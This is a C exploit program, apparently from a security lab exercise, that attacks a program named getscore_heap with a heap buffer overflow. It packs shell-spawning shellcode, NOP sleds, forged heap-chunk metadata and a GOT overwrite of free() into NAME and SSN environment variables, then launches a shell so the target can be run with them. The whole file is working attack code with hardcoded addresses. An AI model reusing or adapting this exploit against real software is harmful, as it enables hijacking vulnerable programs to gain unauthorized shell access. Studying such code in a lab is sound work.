#include <stdio.h>
#include <strings.h>

#define ENV_NAME	"NAME="
#define ENV_SSN		"SSN="
/*
 * Aleph1's shellcode. Used to spawn the shell when the malicious payload
 * is executed.
 */
unsigned char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main()
{
	/*
	 * The exploit contains two parts: the "name" component and the
	 * "ssn" component. The buffer we are able to overflow is based on
	 * the "name" component. Specifically, this buffer is allocated
	 * on the heap and is the size of the name input + 17. Therefore,
	 * we need to setup the "name" component to contain the necessary
	 * prefixes and the shellcode. 
	 *
	 * The "ssn" component is then responsible for filling the remaining
	 * portion of the "name" buffer and setting up the fake heap
	 * structure in the following chunk. After writing NOP's to the end
	 * of the name buffer, this component overwrites the metadata to 
	 * 0xFFFFFF, sets the first machine word of the data section to
	 * the GOT address of free() - 12, and the second word to the 
	 * address of 'jmp 0x6' + 6.   
	 */

	// The initial prefix of NOP's. Note the first two words in the
	// data portion of this chunk will be overwritten with the 
	// forward and backward pointer's of the freed list.
	unsigned char prefix[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
	
	// We will point to the start of this with the return address
	// so we reach the 'jmp 0x6'and jump over the overwrite
	unsigned char nop_jmp[] = "\x90\x90\x90\x90\x90\x90\xEB\x04";
	
	// Junk that will be replaced by the GOT address - 12 and jumped over
	// during execution
	char overwrite[] = "ZZZZ";
	
	// The size metadata we overwrite to make the next chunk free
	unsigned char size[] = "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF";
	
	// GOT address of free() - 12
	unsigned char got_addr[] = "\x24\x9d\x04\x08";
	
	// Address to return to when free() is called.
	unsigned char ret_addr[] = "\xd0\x9e\x04\x08";
	
	// Prefix of the "SSN" portion of the exploit. This fills the remaining
	// bytes of the "NAME" buffer
	unsigned char nop_fill[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

	// Compute the size of the name and ssn portions based on their
	// components
	int name_size = strlen(prefix) + strlen(nop_jmp) + strlen(overwrite) + strlen(shellcode) + 1;
	int ssn_size = strlen(nop_fill) + strlen(size) + strlen(got_addr) + strlen(ret_addr) + 1;
	
	// Build the name portion
	unsigned char name[name_size];
	strcpy(name, prefix);
	strcat(name, nop_jmp);
	strcat(name, overwrite);
	strcat(name, shellcode);
	
	// Build the SSN portion
	unsigned char ssn[ssn_size];
	strcpy(ssn, nop_fill);
	strcat(ssn, size);
	strcat(ssn, got_addr);
	strcat(ssn, ret_addr);

	// Compute the size of the shell variables we will create
	// for NAME and SSN
	int env_name_size = strlen(ENV_NAME) + strlen(name) + 1;
	int env_ssn_size = strlen(ENV_SSN) + strlen(ssn) + 1;
	char env_name[env_name_size];
	char env_ssn[env_ssn_size];

	// Build the NAME shell variable
	strcpy(env_name, ENV_NAME);
	strcat(env_name, name);

	// Build the SSN shell variable
	strcpy(env_ssn, ENV_SSN);
	strcat(env_ssn, ssn);

	// Put the NAME and SSN variables in the environment
	// and fork a new shell. We can now exploit getscore_heap using the
	// following:
	// ./getscore_heap $NAME $SSN
	putenv(env_name);
	putenv(env_ssn);
	system("/bin/bash");
	return 0;
}
